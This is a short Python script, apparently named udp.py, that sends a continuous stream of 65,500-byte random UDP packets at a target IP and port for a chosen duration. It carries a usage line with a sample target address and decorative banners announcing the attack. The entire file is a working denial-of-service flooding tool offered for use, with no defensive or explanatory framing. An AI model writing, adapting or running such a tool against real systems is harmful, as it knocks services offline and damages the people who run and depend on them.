#!/usr/bin/python
import socket, random, sys, time

if len(sys.argv) == 1:
    sys.exit('Usage: python3 udp.py ip port time | contoh: python3 udp.py 38.154.242.34 80 60')

def generate_ascii_art(text):
    return pyfiglet.figlet_format(text)

def UDPFlood():
    port = int(sys.argv[2])
    randport = (True, False)[port == 0]
    ip = sys.argv[1]
    dur = int(sys.argv[3])
    clock = (lambda: 0, time.perf_counter)[dur > 0]
    duration = (1, (clock() + dur))[dur > 0]
    text_wm1 = """\033[93m
.oooooo.oo     .
d8P'    `Y8   .o8
Y88bo.      .o888oo  .oooo.   oooo d8b  .oooo.o
 `"Y8888o.    888   `P  )88b  `888""8P d88(  "8
     `"Y88b   888    .oP"888   888     `"Y88b.
oo     .d8P   888 . d8(  888   888     o.  )88b
8""88888P'    "888" `Y888""8o d888b    8""888P'
 _                            _  _                                                                                    | |    __ _ _   _  ___ _ __  | || |
| |   / _` | | | |/ _ \ '__| | || |_
| |__| (_| | |_| |  __/ |    |__   _|
|_____\__,_|\__, |\___|_|       |_|
            |___/

(attack send)
"""
    ascii_art_output = (text_wm1)
    print(ascii_art_output)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(65500)
    while True:
        port = (random.randint(1, 15000000), port)[randport]
        if clock() < duration:
            sock.sendto(bytes, (ip, port))
        else:
            break

    text_dome = """▄▄                  ▄ ▄ ▄▄
█ █ █▀█ █▀█ ███     ▀▄▀ █ █
█▄▀ █▄█ █ █ █▄▄     █ █ █▄▀

"""
    ascii_art_done = (text_dome)
    print(ascii_art_done)

if __name__ == "__main__":
    UDPFlood()